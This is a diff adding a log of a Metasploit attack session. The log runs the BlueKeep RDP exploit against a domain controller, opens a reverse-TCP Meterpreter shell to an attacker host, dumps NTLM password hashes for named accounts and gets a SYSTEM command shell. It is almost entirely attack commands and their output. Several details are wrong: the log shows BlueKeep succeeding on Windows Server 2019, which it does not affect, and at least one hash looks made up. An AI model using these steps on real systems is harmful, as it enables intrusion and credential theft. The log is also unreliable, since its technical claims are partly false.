@@ -1,0 +1,51 @@
+# Metasploit Exploitation Logs
+# Date: June 20, 2026
+# Target: 192.168.1.30 (Domain Controller)
+
+msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.1.30
+RHOSTS => 192.168.1.30
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set TARGET 3
+TARGET => 3 (Windows 10 / 2019)
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set LHOST 192.168.1.100
+LHOST => 192.168.1.100
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.100:4444
+[*] 192.168.1.30:3389 - Connecting to target for exploitation.
+[*] 192.168.1.30:3389 - Sending exploit payload...
+[+] 192.168.1.30:3389 - Target is VULNERABLE to BlueKeep!
+[*] 192.168.1.30:3389 - Triggering exploit via channel 1003...
+[+] Sending stage (200262 bytes) to 192.168.1.30
+[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.30:49152)
+
+meterpreter > sysinfo
+Computer        : CORETECH-DC01
+OS              : Windows Server 2019 (Build 17763)
+Architecture    : x64
+System Language : en_US
+Domain          : CORETECH.LOCAL
+Logged On Users : 12
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:167117c4f7d88c0a7c8e3f3e7e8e8e8e:::
+jsmith:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+dwilliams:1002:aad3b435b51404eeaad3b435b51404ee:2b2acb9d82f6b59c97f611c0f05b70f3:::
+
+meterpreter > shell
+C:\Windows\system32> whoami
+nt authority\system
+C:\Windows\system32> net user
+User accounts for \\CORETECH-DC01
+-------------------------------------------------------------------------------
+Administrator            Guest                    jsmith
+dwilliams                svc_backup               sql_svc
+
+[!] PRIVILEGE ESCALATION SUCCESSFUL
+[!] DOMAIN CONTROLLER COMPROMISED
+[!] Risk Rating: CRITICAL (CVSS: 9.8) | Impact: Complete System Takeover
